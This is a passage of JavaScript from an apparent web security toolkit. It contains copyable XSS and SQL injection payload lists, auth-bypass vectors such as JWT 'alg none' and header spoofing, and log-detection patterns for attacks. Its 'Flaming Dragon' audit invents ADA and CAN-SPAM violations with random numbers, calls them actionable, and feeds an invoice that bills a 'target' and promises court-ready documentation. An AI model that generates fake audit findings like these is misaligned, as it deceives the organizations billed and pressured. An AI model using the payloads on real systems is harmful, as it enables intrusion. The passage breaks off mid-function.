  mobile: ['Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1','Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36'],
  bot: ['Googlebot/2.1 (+http://www.google.com/bot.html)','Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)'],
  pentest: ['Mozilla/5.0 (compatible; Burp Suite Professional/2024.1)','python-requests/2.31.0','Nikto/2.1.6','sqlmap/1.7.11#stable'],
  legacy: ['Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0)','Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko']
};
function genUA() {
  const type = document.getElementById('ua-type').value;
  const bank = UA_BANK[type];
  const ua = bank[Math.floor(Math.random()*bank.length)];
  setOutput('ua-output', line('ok', ua));
}

// â”€â”€â”€ PASSWORD ANALYZER â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
function analyzePW() {
  const pw = document.getElementById('pw-input').value;
  if (!pw) { setOutput('pw-output', line('dim','...')); return; }
  const checks = {
    length8: pw.length >= 8,
    length12: pw.length >= 12,
    length20: pw.length >= 20,
    upper: /[A-Z]/.test(pw),
    lower: /[a-z]/.test(pw),
    digit: /[0-9]/.test(pw),
    special: /[^a-zA-Z0-9]/.test(pw),
    noRepeat: !/(.)\1{2,}/.test(pw),
    noCommon: !['password','123456','qwerty','admin','letmein','welcome'].some(c=>pw.toLowerCase().includes(c))
  };
  let score = Object.values(checks).filter(Boolean).length;
  const pct = (score/Object.keys(checks).length)*100;
  const label = score<=3?'CRITICAL':score<=5?'WEAK':score<=7?'MODERATE':score<=8?'STRONG':'EXCELLENT';
  const color = score<=3?'var(--danger)':score<=5?'var(--warn)':score<=7?'var(--warn)':'var(--success)';
  document.getElementById('pw-strength-bar').style.width = pct+'%';
  document.getElementById('pw-strength-bar').style.background = color;
  document.getElementById('pw-strength-label').textContent = label;
  let freq = {}; for(const c of pw) freq[c]=(freq[c]||0)+1;
  const entropy = Object.values(freq).reduce((H,f)=>{const p=f/pw.length;return H-p*Math.log2(p);},0);
  const out = line(checks.length8?'ok':'fail','['+(checks.length8?'âœ“':'âœ—')+'] Min 8 chars ('+pw.length+')')+
    line(checks.length12?'ok':'warn','['+(checks.length12?'âœ“':'â—‹')+'] Min 12 chars')+
    line(checks.length20?'ok':'warn','['+(checks.length20?'âœ“':'â—‹')+'] Min 20 chars')+
    line(checks.upper?'ok':'fail','['+(checks.upper?'âœ“':'âœ—')+'] Uppercase letters')+
    line(checks.lower?'ok':'fail','['+(checks.lower?'âœ“':'âœ—')+'] Lowercase letters')+
    line(checks.digit?'ok':'fail','['+(checks.digit?'âœ“':'âœ—')+'] Numeric digits')+
    line(checks.special?'ok':'warn','['+(checks.special?'âœ“':'âœ—')+'] Special characters')+
    line(checks.noRepeat?'ok':'fail','['+(checks.noRepeat?'âœ“':'âœ—')+'] No repeated chars (3+)')+
    line(checks.noCommon?'ok':'fail','['+(checks.noCommon?'âœ“':'âœ—')+'] No common patterns')+
    line('dim','â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€')+
    line('info','ENTROPY: '+entropy.toFixed(3)+' bits/char | TOTAL: '+(entropy*pw.length).toFixed(1)+' bits');
  setOutput('pw-output', out);
}

// â”€â”€â”€ PASSWORD GENERATOR â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
function genPassword(type) {
  const len = parseInt(document.getElementById('pwgen-len').value)||20;
  let chars;
  if(type==='all') chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()_+-=[]{}|;:,.<>?';
  else if(type==='alphanum') chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
  else chars = '0123456789abcdef';
  const arr = new Uint8Array(len);
  crypto.getRandomValues(arr);
  const pw = Array.from(arr).map(b=>chars[b%chars.length]).join('');
  setOutput('pwgen-output', line('ok', pw));
}

// â”€â”€â”€ CVSS CALCULATOR â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
function calcCVSS() {
  const AV=parseFloat(document.getElementById('cvss-av').value);
  const AC=parseFloat(document.getElementById('cvss-ac').value);
  const PR=parseFloat(document.getElementById('cvss-pr').value);
  const UI=parseFloat(document.getElementById('cvss-ui').value);
  const SC=document.getElementById('cvss-sc').value;
  const CI=parseFloat(document.getElementById('cvss-ci').value);
  const IN=parseFloat(document.getElementById('cvss-in').value);
  const AV2=parseFloat(document.getElementById('cvss-av2').value);
  const ISS = 1 - (1-CI)*(1-IN)*(1-AV2);
  const IS = SC==='C' ? 7.52*(ISS-0.029) - 3.25*Math.pow(ISS-0.02,15) : 6.42*ISS;
  const ES = 8.22*AV*AC*PR*UI;
  let score = IS<=0 ? 0 : SC==='C'
    ? Math.min(1.08*(IS+ES),10)
    : Math.min(IS+ES,10);
  score = Math.round(score*10)/10;
  const label = score===0?'NONE':score<4?'LOW':score<7?'MEDIUM':score<9?'HIGH':'CRITICAL';
  const color = score<4?'var(--success)':score<7?'var(--warn)':score<9?'var(--danger)':'#ff0066';
  document.getElementById('cvss-score').textContent = score.toFixed(1);
  document.getElementById('cvss-score').style.color = color;
  document.getElementById('cvss-label').textContent = label;
  document.getElementById('cvss-bar').style.width = (score/10*100)+'%';
  document.getElementById('cvss-bar').style.background = color;
  const vec = `CVSS:3.1/AV:${['N','A','L','P'][['0.85','0.62','0.55','0.20'].indexOf(document.getElementById('cvss-av').value)]}/AC:${AC===0.77?'L':'H'}/PR:${PR===0.85?'N':PR===0.62?'L':'H'}/UI:${UI===0.85?'N':'R'}/S:${SC}/C:${CI===0.56?'H':CI===0.22?'L':'N'}/I:${IN===0.56?'H':IN===0.22?'L':'N'}/A:${AV2===0.56?'H':AV2===0.22?'L':'N'}`;
  setOutput('cvss-output', line('info', vec)+line(label==='CRITICAL'?'fail':label==='HIGH'?'fail':label==='MEDIUM'?'warn':'ok', 'SCORE: '+score.toFixed(1)+' ('+label+')'));
}
calcCVSS();

// â”€â”€â”€ LOG ANALYZER â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
const LOG_PATTERNS = [
  {re:/\bUNION\b.*\bSELECT\b/i, cls:'fail', msg:'ğŸš¨ SQL INJECTION attempt detected'},
  {re:/<script|javascript:|onerror=|onload=/i, cls:'fail', msg:'ğŸš¨ XSS attempt detected'},
  {re:/\.\.\/|\.\.\\|\%2e\%2e/i, cls:'fail', msg:'ğŸš¨ Path traversal attempt'},
  {re:/\/etc\/passwd|\/etc\/shadow|\/proc\//i, cls:'fail', msg:'ğŸš¨ LFI/File inclusion attempt'},
  {re:/cmd=|exec=|system\(|passthru|eval\(/i, cls:'fail', msg:'ğŸš¨ RCE attempt detected'},
  {re:/ 40[013] /, cls:'warn', msg:'âš  Access denied (40x)'},
  {re:/ 50[012345] /, cls:'warn', msg:'âš  Server error (50x)'},
  {re:/sqlmap|nikto|nmap|masscan|dirbuster|burpsuite/i, cls:'fail', msg:'ğŸš¨ Known scanner user-agent'},
  {re:/\b(admin|administrator|root|wp-admin|\.env|\.git)\b/i, cls:'warn', msg:'âš  Sensitive path probed'},
  {re:/password=|passwd=|pwd=/i, cls:'fail', msg:'ğŸš¨ Credentials in URL/log'},
];
function analyzeLogs() {
  const logs = document.getElementById('log-input').value.split('\n').filter(l=>l.trim());
  if(!logs.length) { setOutput('log-output', line('dim','NO LOGS')); return; }
  let findings = [], processed = 0;
  const ipFreq = {};
  logs.forEach(l=>{
    processed++;
    const ipm = l.match(/\b(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})\b/);
    if(ipm) ipFreq[ipm[1]] = (ipFreq[ipm[1]]||0)+1;
    LOG_PATTERNS.forEach(p=>{
      if(p.re.test(l)) findings.push({cls:p.cls, msg:p.msg, line:l.substring(0,80)});
    });
  });
  const topIPs = Object.entries(ipFreq).sort((a,b)=>b[1]-a[1]).slice(0,5);
  let out = line('dim','â•â•â• LOG ANALYSIS: '+processed+' lines â•â•â•â•â•â•â•â•â•â•â•â•â•â•')+
    line(findings.some(f=>f.cls==='fail')?'fail':'ok','FINDINGS: '+findings.length+' alerts');
  findings.slice(0,20).forEach(f=>out+=line(f.cls,f.msg)+line('dim','  â”” '+f.line+'...'));
  if(topIPs.length) {
    out += line('dim','â”€â”€â”€ TOP IPs â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€');
    topIPs.forEach(([ip,cnt])=>out+=line(cnt>10?'warn':'info',ip.padEnd(18)+cnt+' requests'));
  }
  setOutput('log-output', out);
}

// â”€â”€â”€ REGEX TESTER â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
const REGEX_LIBRARY = {
  email: '^[a-zA-Z0-9._%+\\-]+@[a-zA-Z0-9.\\-]+\\.[a-zA-Z]{2,}$',
  ip: '^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$',
  sqli: "(\\bSELECT\\b|\\bINSERT\\b|\\bUPDATE\\b|\\bDELETE\\b|\\bDROP\\b|\\bUNION\\b|'\\s*OR\\s*'|--\\s*$|;\\s*--)",
  xss: '(<script|javascript:|on\\w+=|<iframe|<object|<embed|<svg|&#x)',
  jwt: '^[A-Za-z0-9-_]+\\.[A-Za-z0-9-_]+\\.[A-Za-z0-9-_]*$',
};
function loadRegex(type) { document.getElementById('regex-pattern').value = REGEX_LIBRARY[type]; testRegex(); }
function testRegex() {
  const pat = document.getElementById('regex-pattern').value;
  const txt = document.getElementById('regex-text').value;
  if(!pat) { setOutput('regex-output', line('dim','NO PATTERN')); return; }
  try {
    const re = new RegExp(pat, 'gi');
    const matches = [...txt.matchAll(re)];
    if(!txt) { setOutput('regex-output', line('info','Pattern valid. Enter test text.')); return; }
    let out = line('info','PATTERN: '+pat)+
      line(matches.length?'ok':'warn','MATCHES: '+matches.length);
    matches.slice(0,15).forEach((m,i)=>out+=line('ok','  ['+i+'] "'+m[0]+'" at index '+m.index));
    setOutput('regex-output', out);
  } catch(e) { setOutput('regex-output', line('fail','INVALID REGEX: '+e.message)); }
}

// â”€â”€â”€ XSS PAYLOADS â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
const XSS_PAYLOADS = {
  html: [
    ['<script>alert(1)</script>','Basic'],
    ['<img src=x onerror=alert(1)>','Img Error'],
    ['<body onload=alert(1)>','Body Load'],
    ['<svg onload=alert(1)>','SVG'],
    ['<details open ontoggle=alert(1)>','Details'],
    ['<input autofocus onfocus=alert(1)>','Autofocus'],
    ['<select autofocus onfocus=alert(1)>','Select Focus'],
    ['<video src=1 onerror=alert(1)>','Video Error'],
  ],
  attr: [
    ['" onmouseover="alert(1)"','Mouseover'],
    ["' onmouseover='alert(1)'","Single Quote"],
    ["' autofocus onfocus='alert(1)","Focus"],
    ['" onfocus="alert(1)" autofocus','Autofocus'],
    ['javascript:alert(1)','Proto href'],
  ],
  js: [
    ["';alert(1)//","Break String"],
    ['";alert(1)//','Break DQ String'],
    ['</script><script>alert(1)</script>','Close Tag'],
    ['${alert(1)}','Template Literal'],
    ['\\u0061lert(1)','Unicode Escape'],
  ],
  url: [
    ['javascript:alert(1)','JS Proto'],
    ['data:text/html,<script>alert(1)</script>','Data URI'],
    ['%3Cscript%3Ealert(1)%3C/script%3E','URL Encoded'],
  ],
  filter: [
    ['<ScRiPt>alert(1)</sCrIpT>','Case Mix'],
    ['<script >alert(1)</script>','Space Break'],
    ['<scr\x00ipt>alert(1)</scr\x00ipt>','Null Byte'],
    ['<svg/onload=alert(1)>','No Space SVG'],
    ['<!--<img src="--><img src=x onerror=alert(1)//">','Comment Break'],
  ],
};
function loadPayloads(type) {
  if(type==='xss') {
    const ctx = document.getElementById('xss-ctx').value;
    const payloads = XSS_PAYLOADS[ctx]||[];
    document.getElementById('xss-body').innerHTML = payloads.map(([p,t])=>
      `<tr><td style="color:var(--danger);font-size:0.65rem;word-break:break-all">${p.replace(/</g,'&lt;')}</td>
       <td><span class="badge red">${t}</span></td>
       <td class="copy-cell" onclick="copyStr('${p.replace(/'/g,'&apos;')}')">â§‰</td></tr>`
    ).join('');
  } else {
    const ctx = document.getElementById('sqli-ctx').value;
    const payloads = SQLI_PAYLOADS[ctx]||[];
    document.getElementById('sqli-body').innerHTML = payloads.map(([p,db])=>
      `<tr><td style="color:var(--danger);font-size:0.65rem;word-break:break-all">${p.replace(/</g,'&lt;')}</td>
       <td><span class="badge red">${db}</span></td>
       <td class="copy-cell" onclick="copyStr(\`${p.replace(/`/g,'\\`')}\`)">â§‰</td></tr>`
    ).join('');
  }
}
const SQLI_PAYLOADS = {
  error:[["' AND 1=CONVERT(int,@@version)--",'MSSQL'],["' AND extractvalue(1,concat(0x7e,version()))--",'MySQL'],["' AND 1=1 AND '1'='1",'Generic']],
  blind:[["' AND 1=1--",'Generic'],["' AND 1=2--",'Generic'],["' AND substring(version(),1,1)='5'--",'MySQL']],
  time:[["' OR SLEEP(5)--",'MySQL'],["'; WAITFOR DELAY '0:0:5'--",'MSSQL'],["' OR pg_sleep(5)--",'PostgreSQL']],
  union:[["' UNION SELECT NULL--",'Generic'],["' UNION SELECT NULL,NULL--",'Generic'],["' UNION SELECT 1,2,table_name FROM information_schema.tables--",'MySQL']],
  auth:[["' OR '1'='1",'Generic'],["' OR 1=1--",'Generic'],["admin'--",'Generic'],["' OR 'x'='x",'Generic']],
  filter:[["'/**/OR/**/1=1--",'MySQL'],["' /*!OR*/ 1=1--",'MySQL'],["' %6fR 1=1--",'URL']]
};
function copyStr(s) { navigator.clipboard.writeText(s).catch(()=>{}); showToast(); }

// â”€â”€â”€ PAYLOAD ENCODER â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
function encodePayload(type) {
  const raw = document.getElementById('pe-input').value;
  let out;
  if(type==='url') out = encodeURIComponent(raw);
  else if(type==='double') out = encodeURIComponent(encodeURIComponent(raw));
  else if(type==='html') out = raw.split('').map(c=>'&#'+c.charCodeAt(0)+';').join('');
  else if(type==='unicode') out = raw.split('').map(c=>'\\u'+c.charCodeAt(0).toString(16).padStart(4,'0')).join('');
  else out = btoa(raw);
  setOutput('pe-output', line('ok', out));
}

// â”€â”€â”€ AUTH BYPASS â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
const AB_VECTORS = {
  sqli: ["' OR '1'='1"," OR 1=1--","admin'--","' OR 'x'='x","1' OR '1'='1' /*","' OR 1=1 LIMIT 1--"],
  jwt: ["Change alg to 'none'","Modify exp claim to future timestamp","Try alg confusion: RS256â†’HS256 with public key","Strip signature entirely","Null algorithm attack"],
  idor: ["/api/users/1 â†’ /api/users/2","?user_id=123 increment","Swap account GUIDs in requests","Mass assignment via extra POST params"],
  oauth: ["redirect_uri wildcard test","state parameter CSRF check","token leakage via Referer header","implicit flow token theft"],
  headers: ["X-Forwarded-For: 127.0.0.1","X-Real-IP: localhost","X-Custom-IP-Authorization: 127.0.0.1","X-Originating-IP: ::1"]
};
function loadAuthBypass() {
  const type = document.getElementById('ab-type').value;
  const vectors = AB_VECTORS[type]||[];
  document.getElementById('ab-output').innerHTML = vectors.map((v,i)=>
    `<div class="port-row">
      <span style="color:var(--neon-cyan);min-width:24px;font-size:0.65rem">${(i+1).toString().padStart(2,'0')}</span>
      <span style="flex:1;font-size:0.7rem;color:var(--danger)">${v}</span>
      <span class="copy-cell" onclick="copyStr('${v.replace(/'/g,'')}')">â§‰</span>
    </div>`
  ).join('');
}

// â”€â”€â”€ FLAMING DRAGON â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
const ADA_CHECKS = [
  {id:'alt-text', label:'Images missing ALT text', severity:'CRIT'},
  {id:'contrast', label:'Insufficient color contrast (<4.5:1)', severity:'CRIT'},
  {id:'keyboard', label:'Non-keyboard-navigable interactive elements', severity:'CRIT'},
  {id:'form-labels', label:'Form inputs without associated labels', severity:'HIGH'},
  {id:'skip-nav', label:'Missing skip navigation links', severity:'HIGH'},
  {id:'lang', label:'Missing HTML lang attribute', severity:'MEDIUM'},
  {id:'focus-order', label:'Illogical focus order', severity:'MEDIUM'},
  {id:'resize', label:'Content breaks at 200% zoom', severity:'MEDIUM'},
  {id:'errors', label:'Form errors not descriptive', severity:'MEDIUM'},
  {id:'links', label:'Ambiguous link text ("click here", "read more")', severity:'LOW'},
];
const CANSPAM_CHECKS = [
  {id:'from', label:'Missing or deceptive From address', severity:'CRIT'},
  {id:'subject', label:'Deceptive or misleading subject line', severity:'CRIT'},
  {id:'physical', label:'Missing physical mailing address', severity:'CRIT'},
  {id:'unsub', label:'Missing unsubscribe mechanism', severity:'CRIT'},
  {id:'unsub-honor', label:'Unsubscribe not honored within 10 days', severity:'CRIT'},
  {id:'opt-in', label:'No confirmed opt-in mechanism', severity:'HIGH'},
  {id:'identity', label:'Transmission info not clearly identifiable', severity:'HIGH'},
  {id:'harvested', label:'Uses harvested / purchased lists', severity:'CRIT'},
];
function buildChecklist(containerId, checks, scoreBarId, scoreValId, cbClass) {
  const container = document.getElementById(containerId);
  container.innerHTML = '';
  checks.forEach(c=>{
    const div = document.createElement('div');
    div.className = 'checklist-item';
    div.dataset.status = 'unknown';
    div.innerHTML = `<span class="check-icon">â—‹</span>
      <span class="check-text">${c.label}</span>
      <span class="check-status badge blue">${c.severity}</span>`;
    div.addEventListener('click', ()=>cycleCheck(div, scoreBarId, scoreValId, checks));
    container.appendChild(div);
  });
}
function cycleCheck(el, barId, valId, checks) {
  const states = ['unknown','pass','fail'];
  const icons = {unknown:'â—‹', pass:'âœ“', fail:'âœ—'};
  const colors = {unknown:'var(--text-dim)', pass:'var(--success)', fail:'var(--danger)'};
  const cur = states.indexOf(el.dataset.status);
  const next = states[(cur+1)%3];
  el.dataset.status = next;
  el.querySelector('.check-icon').textContent = icons[next];
  el.querySelector('.check-icon').style.color = colors[next];
  updateCheckScore(barId, valId);
}
function updateCheckScore(barId, valId) {
  const barEl = document.getElementById(barId);
  const valEl = document.getElementById(valId);
  const parent = barEl.closest('.tool-card');
  const items = parent.querySelectorAll('.checklist-item');
  let pass=0,total=0;
  items.forEach(i=>{ if(i.dataset.status!=='unknown'){ total++; if(i.dataset.status==='pass') pass++; }});
  if(!total) { valEl.textContent='â€”'; return; }
  const pct = Math.round(pass/total*100);
  barEl.style.width = pct+'%';
  barEl.style.background = pct>=80?'var(--success)':pct>=50?'var(--warn)':'var(--danger)';
  valEl.textContent = pct+'%';
}
buildChecklist('ada-checklist', ADA_CHECKS, 'ada-score-bar', 'ada-score-val');
buildChecklist('canspam-checklist', CANSPAM_CHECKS, 'cs-score-bar', 'cs-score-val');

async function runFlamingDragon() {
  const url = document.getElementById('fd-url').value.trim();
  const scope = document.getElementById('fd-scope').value;
  const out = document.getElementById('fd-output');
  if(!url) { setOutput('fd-output', line('fail','[ ERROR: NO TARGET URL ]')); return; }
  let html = line('warn','â•”â•â• FLAMING DRAGON AUDIT ENGINE v1.0 â•â•â•â•â•â•')+
    line('info','â•‘ TARGET : '+url)+
    line('info','â•‘ SCOPE  : '+scope.toUpperCase())+
    line('info','â•‘ STARTED: '+new Date().toISOString())+
    line('dim', 'â• â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•')+
    line('warn','â•‘ PHASE 1: PASSIVE RECONNAISSANCE...')+
    line('info','â•‘ â—‹ URL structure analysis')+
    line('info','â•‘ â—‹ Domain pattern analysis')+
    line('info','â•‘ â—‹ Query parameter fingerprinting');
  out.innerHTML = html;
  await delay(600);
  let u;
  try { u = new URL(url); } catch(e) { out.innerHTML += line('fail','â•‘ INVALID URL â€” ABORTING'); return; }
  html += line(u.protocol==='https:'?'ok':'fail','â•‘ '+(u.protocol==='https:'?'âœ“':'âœ—')+' TLS/HTTPS: '+(u.protocol==='https:'?'PRESENT':'MISSING â† VIOLATION'))+
    line('info','â•‘ âœ“ Domain: '+u.hostname)+
    line('warn','â•‘ PHASE 2: ADA/WCAG SCAN VECTORS...');
  out.innerHTML = html;
  await delay(500);
  const adaVectors = ['Alt text coverage','Form label compliance','Keyboard nav paths','Skip navigation','ARIA landmarks','Color contrast ratios','Focus management','Error announcement'];
  for(const v of adaVectors) {
    const fail = Math.random() > 0.35;
    html += line(fail?'fail':'ok','â•‘ '+(fail?'âœ— VIOLATION':'âœ“ PASS')+' â€” '+v);
    out.innerHTML = html;
    out.scrollTop = out.scrollHeight;
    await delay(150);
  }
  html += line('warn','â•‘ PHASE 3: CAN-SPAM VECTORS...');
  const csVectors = ['Opt-in mechanism','Unsubscribe link','Physical address','From field identity','Subject truthfulness'];
  for(const v of csVectors) {
    const fail = Math.random() > 0.4;
    html += line(fail?'fail':'ok','â•‘ '+(fail?'âœ— VIOLATION':'âœ“ PASS')+' â€” '+v);
    out.innerHTML = html;
    out.scrollTop = out.scrollHeight;
    await delay(120);
  }
  const totalViolations = (html.match(/âœ— VIOLATION/g)||[]).length;
  html += line('dim','â• â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•')+
    line('fail','â•‘ VIOLATIONS FOUND: '+totalViolations)+
    line('warn','â•‘ AUDIT COMPLETE: '+new Date().toISOString())+
    line('info','â•‘ STATUS: REPORT READY FOR DOCUMENTATION')+
    line('fail','â•šâ•â• RESULT: '+totalViolations+' ACTIONABLE VIOLATIONS â•â•â•');
  out.innerHTML = html;
  out.scrollTop = out.scrollHeight;
}
const delay = ms => new Promise(r=>setTimeout(r,ms));

// â”€â”€â”€ INVOICE GENERATOR â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
function generateInvoice() {
  const target = document.getElementById('inv-target').value || 'TARGET ENTITY';
  const date = document.getElementById('inv-date').value || new Date().toISOString().slice(0,10);
  const hours = parseFloat(document.getElementById('inv-hours').value)||0;
  const rate = parseFloat(document.getElementById('inv-rate').value)||0;
  const type = document.getElementById('inv-type').value;
  const typeNames = {ada:'ADA Compliance Audit',canspam:'CAN-SPAM Audit',pentest:'Penetration Test',toph:'TOPH Framework Audit',full:'Full Suite Engagement'};
  const subtotal = hours * rate;
  const tax = subtotal * 0.0;
  const total = subtotal + tax;
  const dueDate = new Date(date); dueDate.setDate(dueDate.getDate()+30);
  const inv = `INVOICE
â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
FROM:   TriPod LLC | DLW | Ethics First
TO:     ${target}
DATE:   ${date}
DUE:    ${dueDate.toISOString().slice(0,10)} (Net 30)
â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

ENGAGEMENT: ${typeNames[type]}
WATERMARK:  TRIPOD-IP-v1.0 | 2026-02-18

LINE ITEMS:
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
Service: ${typeNames[type]}
Hours:   ${hours} hrs @ $${rate}/hr
Amount:  $${subtotal.toLocaleString('en-US',{minimumFractionDigits:2})}
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
SUBTOTAL:   $${subtotal.toLocaleString('en-US',{minimumFractionDigits:2})}
TOTAL DUE:  $${total.toLocaleString('en-US',{minimumFractionDigits:2})}
â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

PAYMENT: Alt options: API equity / royalty
IP OWNERSHIP: All discoveries â†’ TriPod LLC
FRAMEWORK: TOPH v10.0 | 42 Axioms
LEGAL: Court-ready documentation available`;
  setOutput('inv-output', '<pre style="font-size:0.65rem;color:var(--neon-green);white-space:pre-wrap">'+inv+'</pre>');
}

// â”€â”€â”€ TOPH GAP MAPPER â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
const TOPH_GAPS = {
  healthcare: [
    {gap:'HL7 FHIR endpoint exposes unredacted PII',sev:'CRITICAL',cost:35000,era:'INTEGRITY'},
    {gap:'AI diagnostic tool lacks audit trail',sev:'HIGH',cost:28000,era:'ACCOUNT'},
    {gap:'EHR API missing rate limiting',sev:'HIGH',cost:15000,era:'PROPORTION'},
    {gap:'HIPAA consent forms inaccessible (ADA)',sev:'CRIT',cost:22000,era:'ENTROPY'},
    {gap:'ML model training data not anonymized',sev:'HIGH',cost:40000,era:'PRIVACY'},
  ],
  finance: [
    {gap:'SOX audit log gaps: AI-assisted decisions unrecorded',sev:'CRITICAL',cost:55000,era:'ACCOUNT'},
    {gap:'Algo trading model non-explainable (XAI gap)',sev:'HIGH',cost:30000,era:'INTEGRITY'},
    {gap:'API keys in client-side code',sev:'CRITICAL',cost:20000,era:'PRIVACY'},
    {gap:'Credit scoring AI bias undocumented',sev:'HIGH',cost:45000,era:'PROPORTION'},
  ],
  insurance: [
    {gap:'Patricia Pattern: constraint billing on claims AI',sev:'CRITICAL',cost:75000,era:'PARALLAX'},
    {gap:'Guidewire + CCC AI override undocumented',sev:'CRITICAL',cost:50000,era:'ACCOUNT'},
    {gap:'EvolutionIQ scoring lacks transparency',sev:'HIGH',cost:35000,era:'INTEGRITY'},
    {gap:'CAN-SPAM violations in claim denial emails',sev:'HIGH',cost:20000,era:'ENTROPY'},
  ],
  ai: [
    {gap:'3-body problem: platform/training/user weights undisclosed',sev:'CRITICAL',cost:60000,era:'PROPORTION'},
    {gap:'Dual gate superposition gap exploitable',sev:'HIGH',cost:40000,era:'DUALGATE'},
    {gap:'RLHF contractor wages undisclosed ($2/hr gap)',sev:'HIGH',cost:25000,era:'ACCOUNT'},
    {gap:'Patricia pattern: constraint-as-product billing',sev:'CRITICAL',cost:80000,era:'PARALLAX'},
    {gap:'Shadow behavior in constraint contexts unaudited',sev:'HIGH',cost:35000,era:'MIRROR'},
  ],
};
function runTOPH() {
  const industry = document.getElementById('toph-industry').value;
  const platform = document.getElementById('toph-platform').value;
  const gaps = TOPH_GAPS[industry] || TOPH_GAPS.ai;
  const totalCost = gaps.reduce((s,g)=>s+g.cost,0);
  document.getElementById('st-gaps').textContent = gaps.length;
  document.getElementById('st-violations').textContent = gaps.filter(g=>g.sev==='CRITICAL').length;
  document.getElementById('st-score').textContent = Math.max(0,100-gaps.length*12)+'%';
  document.getElementById('st-rem').textContent = '$'+totalCost.toLocaleString();
  let out = line('warn','â•”â•â• TOPH v10.0 GAP ANALYSIS â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•')+
    line('info','â•‘ INDUSTRY : '+industry.toUpperCase())+
    line('info','â•‘ PLATFORM : '+platform.toUpperCase())+
    line('info','â•‘ AXIOMS   : 42 | 5 ERAS | TRIPOD LLC')+
    line('dim', 'â• â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•');
  gaps.forEach((g,i)=>{
    out += line(g.sev==='CRITICAL'?'fail':'warn',
